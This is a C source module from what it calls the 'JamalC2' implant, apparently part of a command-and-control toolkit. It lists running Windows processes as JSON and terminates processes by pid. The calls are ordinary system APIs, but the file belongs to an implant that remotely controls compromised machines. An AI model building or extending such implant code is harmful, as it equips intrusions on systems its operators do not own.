/*
 * JamalC2 Implant - Process Operations Implementation
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "process.h"
#include "utils.h"


char* process_list(void) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return safe_strdup("[]");
    }
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    char* result = NULL;
    size_t result_size = 8192;
    size_t result_used = 0;
    
    result = safe_malloc(result_size);
    result[result_used++] = '[';
    
    int first = 1;
    if (Process32First(hSnapshot, &pe)) {
        do {
            char entry[512];
            snprintf(entry, sizeof(entry),
                     "%s{\"pid\":%lu,\"name\":\"%s\",\"ppid\":%lu}",
                     first ? "" : ",",
                     pe.th32ProcessID,
                     pe.szExeFile,
                     pe.th32ParentProcessID);
            
            size_t entry_len = strlen(entry);
            while (result_used + entry_len + 2 > result_size) {
                result_size *= 2;
                result = safe_realloc(result, result_size);
            }
            
            memcpy(result + result_used, entry, entry_len);
            result_used += entry_len;
            first = 0;
            
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    
    result[result_used++] = ']';
    result[result_used] = '\0';
    
    return result;
}

int process_kill(int pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
    if (!hProcess) {
        return -1;
    }
    
    BOOL success = TerminateProcess(hProcess, 0);
    CloseHandle(hProcess);
    
    return success ? 0 : -1;
}
